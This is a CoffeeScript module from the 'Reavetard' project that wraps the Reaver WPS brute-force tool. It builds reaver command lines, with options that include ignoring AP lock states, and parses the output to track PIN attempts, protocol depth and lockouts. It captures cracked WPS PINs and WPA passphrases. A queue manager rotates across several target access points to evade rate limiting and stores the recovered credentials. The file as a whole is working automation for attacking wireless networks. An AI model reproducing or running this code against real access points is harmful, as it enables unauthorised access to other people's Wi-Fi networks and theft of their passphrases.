# Reavetard - Reaver WPS (+Wash) extension scripts
# reaver.coffee :: Module to spawn reaver processes and provide basic output
#   parsing via status update events
# Author: Robbie Saunders http://eibbors.com/[/p/reavetard]
# ==============================================================================

# Module dependencies
# -------------------------
events = require 'events'
{spawn, exec} = require 'child_process'
{REAVER_DEFAULT_ARGS, CONSECUTIVE_FAILURE_LIMIT, DEFAULT_INTERFACE} = require './config'
cli = require './cli'

# Arguments supported by reaver in the format:
# key: [shortFlag, fullFlag, description, includesValue]
REAVER_ARGS = 
  interface:      ['-i', '--interface', 'Name of the monitor-mode interface to use', true]
  bssid:          ['-b', '--bssid', 'BSSID of the target AP', true]
  mac:            ['-m', '--mac', 'MAC of the host system', true]
  essid:          ['-e', '--essid', 'ESSID of the target AP', true]
  channel:        ['-c', '--channel', 'Set the 802.11 channel for the interface (implies -f)', true]
  outFile:        ['-o', '--out-file', 'Send output to a log file [stdout]', true]
  session:        ['-s', '--session', 'Restore a previous session file', true]
  exec:           ['-C', '--exec', 'Execute the supplied command upon successful pin recovery', true]
  daemonize:      ['-D', '--daemonize', 'Daemonize reaver', false]
  auto:           ['-a', '--auto', 'Auto detect the best advanced options for the target AP', false]
  fixed:          ['-f', '--fixed', 'Disable channel hopping', false]
  use5ghz:        ['-5', '--5ghz', 'Use 5GHz 802.11 channels', false]
  veryVerbose:    ['-vv', '--verbose', 'Display non-critical warnings (-vv for more)', false]
  verbose:        ['-v', '--verbose', 'Display non-critical warnings (-vv for more)', false]
  quiet:          ['-q', '--quiet', 'Only display critical messages', false]
  help:           ['-h', '--help', 'Show help', false]
  pin:            ['-p', '--pin', 'Use the specified 4 or 8 digit WPS pin', true]
  delay:          ['-d', '--delay', 'Set the delay between pin attempts [1]', true]
  lockDelay:      ['-l', '--lock-delay', 'Set the time to wait if the AP locks WPS pin attempts [60]', true]
  maxAttempts:    ['-g', '--max-attempts', 'Quit after num pin attempts', true]
  failWait:       ['-x', '--fail-wait', 'Set the time to sleep after 10 unexpected failures [0]', true]
  recurringDelay: ['-r', '--recurring-delay', 'Sleep for y seconds every x pin attempts', true]
  timeout:        ['-t', '--timeout', 'Set the receive timeout period [5]', true]
  m57Timeout:     ['-T', '--m57-timeout', 'Set the M5/M7 timeout period [0.20]', true]
  noAssociate:    ['-A', '--no-associate', 'Do not associate with the AP (association must be done by another application)', false]
  noNacks:        ['-N', '--no-nacks', 'Do not send NACK messages when out of order packets are received', false]
  dhSmall:        ['-S', '--dh-small', 'Use small DH keys to improve crack speed', false]
  ignoreLocks:    ['-L', '--ignore-locks', 'Ignore locked state reported by the target AP', false]
  eapTerminate:   ['-E', '--eap-terminate', 'Terminate each WPS session with an EAP FAIL packet', false]
  nack:           ['-n', '--nack', 'Target AP always sends a NACK [Auto]', false]
  win7:           ['-w', '--win7', 'Mimic a Windows 7 registrar [False]', false]

REAVER_PATTERNS = 
  sending: /Sending (.*)/
  received: /Received (.*)/
  tryingPin: /Trying pin (\d+)/
  timedOut: /WARNING: Receive timeout occurred/
  wpsFailure: /WPS transaction failed \(code: (\w+)\)/
  newChannel: /Switching (\w+) to channel (\d+)/
  waitingBeacon: /Waiting for beacon from (\S+)/
  associated: /Associated with (\S+)/
  rateLimit: /WARNING: Detected AP rate limiting, waiting (\d+) seconds before re-checking/
  associateFailure: /WARNING: Failed to associate with (\S+) \(ESSID: (.*)\)/
  consecutiveFailures: /WARNING: (\d+) failed connections in a row/
  progress: /(\S+)% complete @ (\S+) (\S+) \((\d+) seconds\/pin\)/
  crackedTime: /Pin cracked in (\d+) (\w+)/
  crackedPIN: /WPS PIN: '(\d+)'/
  crackedPSK: /WPA PSK: '(.*)'/
  crackedSSID: /AP SSID: '(.*)'/
  version: /Reaver v(\S+) WiFi Protected Setup Attack Tool/
  # nothingDone: /Nothing done, nothing to save/
  # copyright: /copyright

# Used to track how far into an attempt we get upon failure, which comes in handy
# when trying to decide whether to move onto the next station and troubleshooting
REAVER_PACKET_SEQ = 
  'EAPOL START request': 1
  'identity request': 2
  'identity response': 3
  'M1 message': 4
  'M2 message': 5
  'M3 message': 6
  'M4 message': 7
  'M5 message': 8
  'M6 message': 9
  'M7 message': 10
  'WSC NACK': 0

# Reversed version of above
REAVER_PACKET_SEQ_S = 
  1:  ' St '#> 
  2:  ' Id '#> 
  3:  ' Id '#< 
  4:  ' M1 '#> 
  5:  ' M2 '#< 
  6:  ' M3 '#> 
  7:  ' M4 '#< 
  8:  ' M5 '#> 
  9:  ' M6 '#< 
  10: ' M7 '#> 
  0:  'NACK'

### Child process wrapper for spawned reaver processes ###
class Reaver extends events.EventEmitter

  constructor: (options) ->
    for own key, value of options
      @[key] = value
    @interface ?= DEFAULT_INTERFACE ? 'mon0'
    @bssid ?= null
    @proc = null
    @status =
      foundBeacon: false
      associated: false
      locked: false
      channel: 0
      pin: null
      phase: 0
      sequenceDepth: -1
      alreadyFailed: false
    @metrics = 
      maxSeqDepth: 0
      consecutiveFailures: 0
      timeOuts: 0
      totalFailures: 0
      totalChecked: 0
      timeToCrack: null
      secondsPerPin: null
      startedAt: new Date()

  # Setting a duration will switch to exec vs. real time parsing (spawn)
  start: (args) =>
    # create an arguments array, if not provided by caller
    if not args?
      args = []
      for key, value of REAVER_ARGS when @[key]?
        [flag, option, desc, inclVal] = value
        if @[key] or inclVal then args.push flag
        if inclVal then args.push @[key]
    # kill the existing process, then spawn a new one and bind to the data event
    @stop()
    @proc = spawn 'reaver', args
    @proc.stdout.on 'data', @process
    @proc.stderr.on 'data', @process

  stop: () =>
    if @proc
      @proc.kill()
      @emit 'exit', true

  # parse and emit any discovered stations
  process: (data) =>
    msgs = data.toString('ascii').split '\n'
    for msg in msgs when msg.length > 1
      matched = false
      for key, pattern of REAVER_PATTERNS
        res = pattern.exec msg
        if res
          matched = key
          break
      switch matched
        when false
          matched = "unhandled"
          res = [msg]
        when 'waitingBeacon'
          @status.foundBeacon = false
        when 'newChannel'
          @status.channel = res[2]
          @status.associated = false
        when 'associated'
          @status.foundBeacon = true
          @status.associated = true
        when 'tryingPin'
          @status.alreadyFailed = false
          @status.sequenceDepth = 0
          if @status.pin isnt res[1]
            @metrics.totalChecked++
            @metrics.consecutiveFailures = 0
            if @status.pin isnt null
              if @status.phase is 0 and @status.pin[0..3] is res[1][0..3]
                @status.phase = 1
                @emit 'completed', 1, { pin: res[1][0..3] }
            @status.pin = res[1]
        when 'sending', 'received'
          if REAVER_PACKET_SEQ[res[1]] > @status.sequenceDepth
            @status.sequenceDepth = REAVER_PACKET_SEQ[res[1]]
            @status.sequenceNew = true
            @metrics.maxSeqDepth = Math.max(@metrics.maxSeqDepth, @status.sequenceDepth)
          else
            @status.sequenceNew = false
        when 'timedOut', 'wpsFailure'
          if matched is 'timedOut' then @metrics.timeOuts++ 
          if not @status.alreadyFailed
            @metrics.consecutiveFailures++
            @metrics.totalFailures++
            @status.alreadyFailed = true
        when 'rateLimit', 'associateFailure'
          @status.associated = false 
          @status.locked = (matched is 'rateLimit')
          @status.sequenceDepth = -1
        when 'consecutiveFailures'
          @metrics.consecutiveFailures 
        when 'progress'
          @metrics.secondsPerPin = res[4] ? null
        when 'crackedPSK'
          @emit 'completed', 2,  'psk', res[1]
        when 'crackedPIN'
          @emit 'completed', 2, 'pin', res[1]
        when 'crackedTime'
          @status.phase = 2
          @metrics.timeToCrack = res[1..2].join(' ')
          @emit 'completed', 2, 'time', @metrics.timeToCrack
        when 'crackedSSID'
          @emit 'completed', 2, 'ssid', res[1]
      @emit 'status', matched, @status, @metrics, res

# Moved from reavetard.coffee since almost all of the code was heavily
# related to the Reaver class above.
class ReaverQueueManager extends events.EventEmitter

  constructor: (stations, @interface) ->
    @priority = [] # cracking sessions that are working
    @secondary = [] # sessions with non-fatal issues
    @finished = [] # complete and/or completely fucked targets
    for station in stations
      station.priority = true
      @priority.push station
    @active = null
    @interface ?= config.DEFAULT_INTERFACE 
    @solitaire = stations.length <= 1

  # Will stop the active process and start a passed station
  # Calls @next if station is not provided
  start: (station) =>
    if @active or @reaver then @stop('skipped') 
    if station then @active = station
    else @active = @next()
    if @active # next may return false so we gotta check
      # if this is the only station we have, then set solitaire flag
      if @priority.length is 0 and @secondary.length is 0 then @solitaire = true
      @active.reaverArgs ?= REAVER_DEFAULT_ARGS(@active, @interface)
      @reaver = new Reaver(@active.reaverArgs)
      # Setup our event listeners for the update/completed events
      @reaver.on 'status', @handleUpdates
      @reaver.on 'completed', @handleCompleted
      @reaver.start()
      cli.statusBar 'procbar', "#{@active.essid ? @active.bssid}"

  # Returns the next queued station or emits end:empty event and returns false
  next: () =>
    if @priority.length > 0
      @priority.shift()
    else if @secondary.length > 0
      @secondary.shift()
    else
      @emit 'end', 'empty', @finished
      false

  # Stops the active process and stashes it in one of the 3 arrays based
  # on the reason argument. Any key/value pairs of details argument are 
  # passed on to station before being pushed to its destination.
  stop: (reason, results) =>
    # Always stop the running process and copy over results
    if @reaver 
      if @active 
        @active.results ?= {}
        @active.results.snapshots ?= { status: [], metrics: [] }
        @active.results.snapshots.status.push @reaver.status ? 'empty'
        @reaver.metrics.stoppedAt = new Date()
        @active.results.snapshots.metrics.push @reaver.metrics ? 'empty'
      @reaver.stop()
      delete @reaver
    if @active? and results 
      (@active[k] = v) for k,v of results
    switch reason
      when 'paused'
        if @active.priority then @priority.unshift @active
        else @secondary.unshift @active
      when 'killed' # 
        @finished.push @active
        @finished = @finished.concat(@priority, @secondary)
        @emit 'end', 'killed', @finished
      when 'skipped', 'wait' # Skipped or ran into temporary issue
        if not @solitaire
          if @active.priority then @priority.push @active 
          else @secondary.push @active
      when 'cracked'
        @active.success = true
        @finished.push @active
      when 'fatal' # There was a deal breaker, like no device communication
        @active.success = false
        @finished.push @active
      else # Some unknown issue? Push to second string queue
        # Set priority to false? (currently will put back into priority queue after one revolution)
        @secondary.push @active
    # Always clear the active station reference
    @active = null
    if reason isnt 'killed' then @emit 'stopped', reason

  # Used to verify some condition by calling fn after period (milliseconds)
  # has elapsed, then calling success or failure based on fn's return value
  # If isInterval, then each function will be passed the interval object, 
  # in order to facilitate clearing / etc.
  verify: (fn, period, success, failure, isInterval=false) =>
    self = @
    if typeof(fn) isnt 'function'
      if fn then result = success else result = failure 
      if isInterval 
        iv = setInterval(( => result.apply(null, [self, iv])), period)
      else 
        setTimeout((=> result.apply(null, [self, false])), period)
    else
      result = (interval=false) => 
        res = fn.apply(null, [self, interval])
        if res then success.apply(null, [self, interval])
        else failure.apply(null, [self, interval])
      if isInterval
        iv = setInterval(( => result.apply(null, [iv])), period)
      else
        setTimeout( result, period )

  # Basically extends the Reaver class' input handlers to include printing
  # compact status bars to stdout and stop/rotate when necessary or advantageous
  handleUpdates: (update, status, metrics, data) =>
    switch update
      when 'waitingBeacon'
        cli.statusBar 'beacon'
      when 'associated'
        @active.essid ?= data[1]
        cli.statusBar 'associated'
      when 'tryingPin'
        cli.statusBar 'pinbar', "#{status.pin}", metrics
      when 'sending', 'received'
        if status.sequenceNew 
          cli.statusBar status.sequenceDepth
        else 
          if status.sequenceDepth is 0
            cli.statusbar 'nack'
      when 'timedOut'
        cli.statusBar('timeout')
        @emit 'failed', status, metrics
      when 'wpsFailure'
        cli.statusBar "fail#{data[1][3]}"
        @emit 'failed', status, metrics
      when 'rateLimit'
        if @solitaire then cli.statusBar 'error', 'LOCKING DETECTED', 'waiting until resolved... (solitaire=true)'
        else cli.statusBar 'error', 'LOCKING DETECTED', 'rotating target networks...'
        @stop('wait', { priority: false, error: 'locking' })
      when 'associateFailure'
        @active.essid ?= data[1]
        cli.statusBar 'error', 'CANNOT ASSOCIATE', 'aborting current target & rotating...'
        @stop('fatal', { error: 'associateFailure' })
    if metrics.consecutiveFailures >= CONSECUTIVE_FAILURE_LIMIT
      cli.statusBar 'error', 'FAILURE LIMIT TRIGGERED', 'rotating target networks...'
      @stop('failures', { priority: false, error: 'consecutiveFailures' })
     
  handleCompleted: (phase, key, value) =>
    if @active?
      @active.results ?= {}
      @active.results[key] = value 
    if phase is 1
      cli.statusBar 'success', 'Phase 1 completed!', "First 1/2 of PIN: #{value}"
    if phase is 2
      if key is 'ssid' # sent last, meaning we can start the next one
        cli.statusBar 'success', 'Phase 2 completed!',"Results: #{JSON.stringify(@active.results)}"
        @stop('cracked')

module.exports.Reaver = Reaver
module.exports.ReaverQueueManager = ReaverQueueManager
